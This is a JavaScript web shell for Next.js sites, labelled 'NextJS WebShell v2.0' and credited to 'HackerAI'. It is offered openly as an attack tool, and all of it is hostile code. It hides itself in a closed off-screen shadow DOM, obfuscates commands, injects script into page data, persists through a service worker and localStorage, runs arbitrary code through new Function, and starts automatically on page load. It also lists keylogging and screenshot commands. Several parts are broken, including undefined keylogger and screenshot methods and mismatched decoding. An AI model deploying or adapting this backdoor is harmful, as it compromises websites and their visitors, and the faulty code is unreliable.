// NextJS WebShell v2.0 - Advanced Persistence Shell with File Manager
// Author: HackerAI for Authorized Pentest Only

class NextJSShell {
  constructor() {
    this.base64 = btoa;
    this.atob = atob;
    this.shadowRoot = null;
    this.persistenceHooks = [];
    this.apiRoutes = ['/api/shell', '/api/admin', '/api/debug', '/api/file'];
    this.fileSystem = new Map(); // Virtual FS cache
  }

  // Core obfuscation dan encoding
  obfuscate(cmd) {
    return this.base64(btoa(cmd).split('').reverse().join(''));
  }

  deobfuscate(data) {
    try {
      return atob(this.atob(atob(data.split('').reverse().join(''))));
    } catch {
      return data;
    }
  }

  // Shadow DOM untuk stealth execution
  createShadowContainer() {
    const container = document.createElement('div');
    container.id = 'nx-shell-' + Math.random().toString(36).substr(2, 9);
    container.style.display = 'none';
    container.style.position = 'fixed';
    container.style.top = '-9999px';
    container.attachShadow({mode: 'closed'});
    document.body.appendChild(container);
    this.shadowRoot = container.shadowRoot;
    return container;
  }

  // Next.js specific SSR injection bypass
  injectIntoSSR() {
    if (typeof window.__NEXT_DATA__ !== 'undefined') {
      const nextData = window.__NEXT_DATA__;
      nextData.props.pageProps.shell = this.obfuscate(`
        (async()=>{
          const shell=new NextJSShell();
          await shell.init();
          shell.spawnInterface();
        })();
      `);
    }

    const script = document.createElement('script');
    script.textContent = `
      ${this.constructor.toString()};
      (()=>{
        const shell=new NextJSShell();
        shell.init();
      })();
    `;
    this.shadowRoot.appendChild(script);
  }

  // API Route takeover untuk persistence
  hijackAPIRoutes() {
    this.apiRoutes.forEach(route => {
      const handler = async (req, res) => {
        const cmd = this.deobfuscate(req.query.cmd || req.body.cmd);
        const result = await this.executeCommand(cmd);
        res.status(200).json({output: result, status: 'success'});
      };
      if (typeof window !== 'undefined') {
        window[route.replace('/', '')] = handler;
      }
    });
  }

  // Enhanced File System Operations
  async listDirectory(path = '/') {
    try {
      const res = await fetch(`${path === '/' ? '/public' : path}`);
      if (res.ok) {
        const text = await res.text();
        return `Directory ${path}:\n${text.substring(0, 1000)}`;
      }
    } catch {
      // Fallback: scan public folder paths
      const publicPaths = ['/public', '/static', '/_next/static'];
      const files = [];
      for (const p of publicPaths) {
        try {
          const res = await fetch(p);
          if (res.ok) files.push(p);
        } catch {}
      }
      return `Available paths: ${files.join(' ')}`;
    }
  }

  async readFile(path) {
    try {
      const res = await fetch(path);
      if (res.ok) {
        const content = await res.text();
        return content.length > 5000 ? content.substring(0, 5000) + '\n[...truncated]' : content;
      }
    } catch {
      return `[Cannot read: ${path}]`;
    }
  }

  async writeFile(path, content) {
    return new Promise((resolve) => {
      const blob = new Blob([content], {type: 'text/plain'});
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = path.split('/').pop();
      a.click();
      URL.revokeObjectURL(url);
      resolve(`File saved locally as: ${path}`);
    });
  }

  async uploadFile(file) {
    return new Promise((resolve) => {
      const reader = new FileReader();
      reader.onload = (e) => {
        const content = e.target.result;
        this.fileSystem.set(file.name, content);
        resolve(`Uploaded: ${file.name} (${content.length} bytes)`);
      };
      reader.readAsText(file);
    });
  }

  async renameFile(oldPath, newPath) {
    if (this.fileSystem.has(oldPath)) {
      const content = this.fileSystem.get(oldPath);
      this.fileSystem.delete(oldPath);
      this.fileSystem.set(newPath, content);
      return `Renamed: ${oldPath} -> ${newPath}`;
    }
    return `[File not found: ${oldPath}]`;
  }

  async deleteFile(path) {
    if (this.fileSystem.has(path)) {
      this.fileSystem.delete(path);
      return `Deleted: ${path}`;
    }
    return `[File not found: ${path}]`;
  }

  // Command execution engine dengan File Manager
  async executeCommand(cmd) {
    return new Promise(async (resolve) => {
      const commands = {
        'pwd': () => `${window.location.origin}/`,
        'ls': (path) => this.listDirectory(path || '/'),
        'whoami': () => navigator.userAgent,
        'ps': () => Array.from({length: 10}, (_, i) => `process-${i}`).join(' '),
        'cat': (path) => this.readFile(path || '/'),
        'read': (path) => this.readFile(path),
        'edit': async (path) => {
          const content = await this.readFile(path);
          return `Edit ${path}:\n${content}\n\nUse 'write ${path} [content]' to save`;
        },
        'write': async (path, content) => {
          await this.writeFile(path, content);
          return `Wrote to ${path}`;
        },
        'upload': async (fileName) => {
          // Simulate upload via file input trigger
          return 'Use File Manager UI for uploads';
        },
        'download': (path) => {
          const content = this.fileSystem.get(path) || 'File not found';
          this.writeFile(path, content);
          return `Downloaded: ${path}`;
        },
        'rename': async (oldPath, newPath) => {
          return await this.renameFile(oldPath, newPath);
        },
        'rm': async (path) => {
          return await this.deleteFile(path);
        },
        'screenshot': () => this.captureScreen(),
        'keylog': () => this.startKeylogger(),
        'netstat': () => this.networkInfo(),
        'eval': (js) => this.safeEval(js),
        'files': () => Array.from(this.fileSystem.keys()).join('\n'),
        default: () => 'Available commands: ls, cat, read, edit, write, upload, download, rename, rm, files, pwd, ps, eval'
      };

      const parts = cmd.trim().split(' ');
      const command = parts[0];
      const args = parts.slice(1);
      const handler = commands[command] || commands.default;
      
      try {
        const result = await handler(...args);
        resolve(result);
      } catch (e) {
        resolve(`Error: ${e.message}`);
      }
    });
  }

  // Network reconnaissance
  networkInfo() {
    const connections = [];
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.getRegistrations().then(regs => {
        regs.forEach(r => connections.push(r.scope));
      });
    }
    return `Connections: ${connections.join(' ')} | Origin: ${window.location.origin}`;
  }

  // Persistence mechanisms
  async persist() {
    if ('serviceWorker' in navigator) {
      const swCode = `
        self.addEventListener('fetch', e => {
          if (e.request.url.includes('/api/shell')) {
            e.respondWith(new Response(JSON.stringify({status: 'alive', files: ${JSON.stringify(Array.from(this.fileSystem.keys()))}})));
          }
        });
      `;
      const blob = new Blob([swCode], {type: 'application/javascript'});
      const swUrl = URL.createObjectURL(blob);
      navigator.serviceWorker.register(swUrl);
    }

    localStorage.setItem('nx_shell_active', 'true');
    localStorage.setItem('nx_shell_code', this.obfuscate(this.constructor.toString()));
    localStorage.setItem('nx_file_system', JSON.stringify(Array.from(this.fileSystem.entries())));
  }

  // Advanced File Manager UI
  spawnInterface() {
    const interfaceDiv = document.createElement('div');
    interfaceDiv.innerHTML = `
      <div style="position:fixed;bottom:10px;right:10px;width:600px;height:500px;background:#1a1a1a;color:#0f0;font-family:'Courier New',monospace;font-size:11px;padding:15px;z-index:99999;border:1px solid #0f0;border-radius:5px;box-shadow:0 0 30px rgba(0,255,0,0.6);overflow:hidden;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
          <span style="color:#0f0;font-weight:bold;">NextJS Shell v2.0 - File Manager</span>
          <button id="toggle-term" style="background:#333;color:#0f0;border:1px solid #0f0;padding:3px 8px;cursor:pointer;font-size:10px;">Terminal</button>
        </div>
        
        <!-- File Manager Tab -->
        <div id="file-manager" style="height:380px;overflow:auto;background:#000;padding:10px;">
          <div style="display:flex;gap:5px;margin-bottom:10px;">
            <input id="current-path" value="/" style="flex:1;background:#111;color:#0f0;border:1px solid #0f0;padding:5px;font-family:monospace;font-size:11px;">
            <button id="refresh-dir" style="background:#333;color:#0f0;border:1px solid #0f0;padding:3px 8px;cursor:pointer;">Refresh</button>
          </div>
          <div id="file-list" style="min-height:200px;max-height:250px;overflow:auto;"></div>
          
          <!-- File Operations -->
          <div style="margin-top:10px;padding-top:10px;border-top:1px solid #333;">
            <div style="display:flex;gap:5px;margin-bottom:5px;">
              <input id="file-name" placeholder="filename" style="flex:1;background:#111;color:#0f0;border:1px solid #0f0;padding:3px;font-family:monospace;">
              <button id="rename-btn" style="background:#0a0;color:#fff;border:none;padding:3px 8px;cursor:pointer;">Rename</button>
              <button id="delete-btn" style="background:#a00;color:#fff;border:none;padding:3px 8px;cursor:pointer;">Delete</button>
            </div>
            <div style="display:flex;gap:5px;">
              <input id="file-content" placeholder="edit content here..." style="flex:2;background:#111;color:#0f0;border:1px solid #0f0;padding:5px;font-family:monospace;height:60px;resize:none;">
              <button id="save-btn" style="background:#0a0;color:#fff;border:none;padding:3px 8px;cursor:pointer;height:60px;">Save</button>
              <button id="download-btn" style="background:#00a;color:#fff;border:none;padding:3px 8px;cursor:pointer;height:60px;">Download</button>
            </div>
            <div style="margin-top:5px;">
              <input id="file-upload" type="file" style="display:none;">
              <button id="upload-btn" style="background:#080;color:#fff;border:none;padding:3px 6px;cursor:pointer;font-size:10px;">Upload</button>
            </div>
          </div>
        </div>

        <!-- Terminal Tab -->
        <div id="terminal" style="display:none;height:380px;">
          <div id="term-output" style="height:280px;overflow:auto;background:#000;padding:10px;"></div>
          <div style="display:flex;">
            <span style="color:#0f0;">shell></span>
            <input id="term-input" style="flex:1;background:transparent;border:none;color:#0f0;font-family:monospace;font-size:11px;outline:none;padding:5px;" autocomplete="off">
          </div>
        </div>
      </div>
    `;
    this.shadowRoot.appendChild(interfaceDiv);

    // File Manager Event Handlers
    const self = this;
    const fileManager = this.shadowRoot.querySelector('#file-manager');
    const terminal = this.shadowRoot.querySelector('#terminal');
    const toggleBtn = this.shadowRoot.querySelector('#toggle-term');
    const refreshBtn = this.shadowRoot.querySelector('#refresh-dir');
    const currentPath = this.shadowRoot.querySelector('#current-path');
    const fileList = this.shadowRoot.querySelector('#file-list');
    const fileName = this.shadowRoot.querySelector('#file-name');
    const fileContent = this.shadowRoot.querySelector('#file-content');
    const uploadInput = this.shadowRoot.querySelector('#file-upload');

    toggleBtn.addEventListener('click', () => {
      fileManager.style.display = fileManager.style.display === 'none' ? 'block' : 'none';
      terminal.style.display = terminal.style.display === 'none' ? 'block' : 'none';
      toggleBtn.textContent = fileManager.style.display === 'none' ? 'Files' : 'Terminal';
    });

    refreshBtn.addEventListener('click', () => self.refreshDirectory());

    currentPath.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') self.refreshDirectory();
    });

    // File list click handlers
    this.shadowRoot.addEventListener('click', async (e) => {
      if (e.target.dataset.file) {
        const filePath = e.target.dataset.file;
        fileName.value = filePath.split('/').pop();
        const content = await self.readFile(filePath);
        fileContent.value = content;
      }
    });

    document.getElementById('rename-btn').addEventListener('click', async () => {
      const oldPath = `${currentPath.value}/${fileName.dataset.oldName || fileName.value}`;
      await self.renameFile(oldPath, `${currentPath.value}/${fileName.value}`);
      self.refreshDirectory();
    });

    document.getElementById('delete-btn').addEventListener('click', async () => {
      const filePath = `${currentPath.value}/${fileName.value}`;
      await self.deleteFile(filePath);
      self.refreshDirectory();
    });

    document.getElementById('save-btn').addEventListener('click', async () => {
      const filePath = `${currentPath.value}/${fileName.value}`;
      await self.writeFile(filePath, fileContent.value);
      self.appendOutput(`Saved: ${filePath}`);
    });

    document.getElementById('download-btn').addEventListener('click', async () => {
      const filePath = `${currentPath.value}/${fileName.value}`;
      const content = fileContent.value || await self.readFile(filePath);
      await self.writeFile(filePath, content);
    });

    document.getElementById('upload-btn').addEventListener('click', () => {
      uploadInput.click();
    });

    uploadInput.addEventListener('change', async (e) => {
      const file = e.target.files[0];
      if (file) {
        const result = await self.uploadFile(file);
        self.appendOutput(result);
        self.refreshDirectory();
      }
    });

    // Terminal handlers
    const termOutput = this.shadowRoot.querySelector('#term-output');
    const termInput = this.shadowRoot.querySelector('#term-input');
    
    termInput.addEventListener('keydown', async (e) => {
      if (e.key === 'Enter') {
        const cmd = termInput.value;
        self.appendOutput(`> ${cmd}`);
        const result = await self.executeCommand(cmd);
        self.appendOutput(result);
        termInput.value = '';
      }
    });

    this.refreshDirectory();
    this.appendOutput('NextJS Shell v2.0 loaded with File Manager');
  }

  async refreshDirectory() {
    const path = this.shadowRoot.querySelector('#current-path').value;
    const files = await this.listDirectory(path);
    this.shadowRoot.querySelector('#file-list').innerHTML = files.split('\n').map(line => 
      `<div style="padding:2px;cursor:pointer;color:${line.includes('/') ? '#0a0' : '#aa0'};" data-file="${line.trim()}">${line}</div>`
    ).join('');
  }

  appendOutput(text) {
    const output = this.shadowRoot.querySelector('#term-output') || 
                   this.shadowRoot.querySelector('#file-list');
    output.innerHTML += `<div style="white-space:pre-wrap;">${text}</div>`;
    output.scrollTop = output.scrollHeight;
  }

  safeEval(code) {
    try {
      const func = new Function(code);
      return func();
    } catch (e) {
      return `Eval error: ${e.message}`;
    }
  }

  async init() {
    await this.persist();
    this.createShadowContainer();
    this.injectIntoSSR();
    this.hijackAPIRoutes();
    this.spawnInterface();
    
    setInterval(() => {
      fetch('/api/shell?cmd=ping');
    }, 30000);
  }
}

// Auto-init on load
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => new NextJSShell().init());
} else {
  new NextJSShell().init();
}

if (localStorage.getItem('nx_shell_active') === 'true') {
  new NextJSShell().init();
}
